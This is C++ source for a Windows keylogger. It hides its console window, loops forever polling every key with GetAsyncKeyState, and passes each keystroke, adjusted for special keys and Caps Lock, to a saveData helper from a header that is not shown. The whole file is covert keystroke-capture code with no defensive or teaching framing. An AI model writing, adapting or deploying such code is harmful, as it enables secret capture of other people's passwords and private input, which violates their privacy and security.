//To terminate the program Run: "taskkill /F /IM keylogger.exe" on terminal

#include <iostream>
#include <windows.h>
#include <bits/stdc++.h>
#include "saveData.h"
using namespace std;

int main() {
    //calling "saveData.h"
    saveData a;
    //Special key array
    int specialKeyArray[] = {VK_SPACE,VK_RETURN,VK_SHIFT,VK_BACK,VK_TAB,VK_CONTROL,VK_MENU,VK_CAPITAL};
    string specialKeyChar;
    bool isSpecialKey;

    //Hiding Terminal window
    HWND hwnd= GetConsoleWindow();
    ShowWindow(hwnd,SW_HIDE);

    //Loop Forever
    while(true){
        //Loop Through each key
        for(int key=8;key<=190;key++){
            //Check key is pressed:
            if(GetAsyncKeyState(key) == -32767){
                //key is pressed
                //Check key is a Special key
                isSpecialKey= find(begin(specialKeyArray),end(specialKeyArray),key)!=end(specialKeyArray);
                if(isSpecialKey){
                    //This is a special key we need to translate it
                    specialKeyChar= a.TranslateSpecialKey(key);
                    //save data
                    a.save_data(specialKeyChar);
                }
                else{
                    //This is not a special key. We need to check if it is uppercase or lower case
                   if(GetKeyState(VK_CAPITAL)){
                       //CapsLock is on
                        a.save_data(string(1,(char)key));
                   }
                   else{
                       //CapsLock is off
                       //Turn the character into lowercase before save
                       a.save_data(string(1,(char) tolower(key)));
                   }
                }
            }
        }
    }
    return 0;
}
